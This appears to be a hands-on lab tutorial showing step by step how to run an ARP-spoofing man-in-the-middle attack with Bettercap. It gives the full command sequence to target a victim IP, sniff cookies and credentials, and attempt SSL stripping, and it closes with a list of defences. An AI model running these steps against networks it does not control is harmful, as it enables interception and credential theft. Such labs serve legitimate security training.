# 🧪 Hands-On Lab: Man-in-the-Middle (MITM) Attack Using Bettercap

*A practical lab for learning ARP spoofing and traffic interception on a local network.*

---

## 📌 Overview

This lab walks you through performing a **Man-in-the-Middle (MITM)** attack using **Bettercap** on a local network. It is for **learning and testing on your own devices only**.

You will learn:

* Scanning your local network
* Identifying a target device
* Performing ARP spoofing
* Intercepting HTTP/HTTPS traffic
* Capturing credentials and requests

---

## ⚠️ Legal Disclaimer

This lab is **only for educational purposes** and must be performed **on your own network and your own devices**. Never attack a network you do not own or control.

---

## 🧰 Requirements

* Kali Linux or any Linux distro with Bettercap
* A Wi-Fi network you own
* One victim device (phone or laptop) connected to the same network
* Root/administrator privileges

---

## 📥 Step 1 — Install Bettercap

On Kali Linux, Bettercap is already installed. If not, install it:

```bash
sudo apt update
sudo apt install bettercap
```

Check version:

```bash
bettercap -version
```

---

## 🌐 Step 2 — Identify Your Network Interface

List your interfaces:

```bash
ip a
```

Start Bettercap with your network interface:

```bash
sudo bettercap -iface wlan0
```

---

## 🔍 Step 3 — Scan the Network

In the Bettercap shell:

```text
net.probe on
net.recon on
```

List discovered hosts:

```text
net.show
```

Example:

```
192.168.1.1    Router
192.168.1.15   Victim (Android)
192.168.1.21   Laptop
```

---

## 🎯 Step 4 — Set the Target

```text
set arp.spoof.targets 192.168.1.15
```

(Replace with your victim's IP.)

---

## 🧪 Step 5 — Start ARP Spoofing

```text
arp.spoof on
```

You are now positioned between the victim and the router.

---

## 📡 Step 6 — Sniff Traffic

```text
net.sniff on
```

Captured data may include:

* HTTP requests
* Cookies
* Parameters
* Login credentials

---

## 🔐 Step 7 — Intercept HTTPS (Optional)

```text
https.proxy on
```

Bettercap will attempt SSL stripping where possible.

---

## 📁 Step 8 — Save Captured Traffic

```text
set net.sniff.output /home/user/mitm-capture.pcap
net.sniff on
```

View the file later in **Wireshark**.

---

## 🛑 Step 9 — Stop the Attack

```text
arp.spoof off
net.sniff off
https.proxy off
quit
```

---

## 🧠 What You Learned

* Bettercap network reconnaissance
* ARP spoofing mechanics
* Intercepting and analyzing victim traffic

---

## 🛡 Defending Against MITM Attacks

* Use **WPA3/WPA2**
* Disable **WPS**
* Use **VPN**
* Update router firmware
* Enable **client isolation**
* Use **Dynamic ARP Inspection (DAI)** when possible
* Use **HTTPS** everywhere

---

## 📘 Conclusion

This lab demonstrates how powerful MITM attacks can be when a network is not secure. Understanding MITM is essential for:

* SOC Analysts
* Pentesters
* Red Teamers
* Network Security Engineers
